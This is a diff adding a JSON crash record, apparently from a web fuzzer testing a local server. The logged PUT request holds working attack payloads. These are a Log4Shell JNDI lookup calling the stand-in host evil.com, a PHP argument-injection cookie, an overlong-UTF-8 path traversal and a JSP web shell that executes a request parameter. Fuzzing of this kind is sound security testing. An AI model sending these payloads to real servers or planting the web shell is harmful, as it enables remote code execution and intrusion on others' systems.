@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:42:21.726655",
+  "crash_type": "server_crash",
+  "payload": "PUT /test.jspx?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Cookie': '%AD-d%20allow_url_include=1', 'Accept-Language': '%c0%ae%c0%ae/', 'Content-Length': '59', 'Content-Range': 'bytes 0-100/101'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "211e838819666283",
+  "request_method": "PUT",
+  "request_path": "/test.jspx?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Cookie": "%AD-d%20allow_url_include=1",
+    "Accept-Language": "%c0%ae%c0%ae/",
+    "Content-Length": "59",
+    "Content-Range": "bytes 0-100/101"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 653
+}
